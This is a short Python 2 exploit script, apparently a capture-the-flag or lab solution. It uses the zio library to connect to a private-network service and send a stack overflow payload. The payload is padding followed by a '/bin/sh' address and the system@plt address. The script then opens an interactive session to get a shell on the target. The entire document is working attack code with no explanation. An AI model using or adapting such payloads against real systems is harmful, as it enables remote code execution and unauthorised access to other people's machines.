#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

ip = '10.211.55.48'
port = 1234

system_plt = 0x8048430
binsh_addr = 0x556e5433

io = zio((ip, port), timeout=10000, print_write=COLORED(REPR))
payload = 'a' * 36 + l32(binsh_addr)  + '\xff'*8 + l32(system_plt) + '\n' + '-' + '\n'
io.write(payload)
io.interact()
